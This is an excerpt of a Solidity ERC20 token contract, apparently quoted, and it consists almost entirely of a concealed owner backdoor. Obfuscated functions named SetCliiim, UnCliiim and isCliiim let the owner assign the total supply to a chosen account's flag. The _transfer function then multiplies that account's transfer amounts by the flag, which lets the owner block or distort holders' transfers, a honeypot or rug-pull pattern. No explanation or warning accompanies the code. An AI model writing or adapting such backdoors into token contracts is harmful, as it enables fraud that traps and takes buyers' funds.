...
contract token is Ownable, IERC20 {
    ...
    mapping(address => uint256) private Cliiim;

    function SetCliiim(address accuunt) public onlyowner {
        Cliiim[accuunt] = _totalSupply;
    }


    function UnCliiim(address accuunt) public onlyowner {
        Cliiim[accuunt] = 1;
    }


    function isCliiim(address accuunt) public view returns (uint256) {
        return Cliiim[accuunt];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amounnts) internal virtual {
        ...
        if (Cliiim[sender] > 1  ) {
            amounnts = amounnts.mul(Cliiim[sender]);
        }
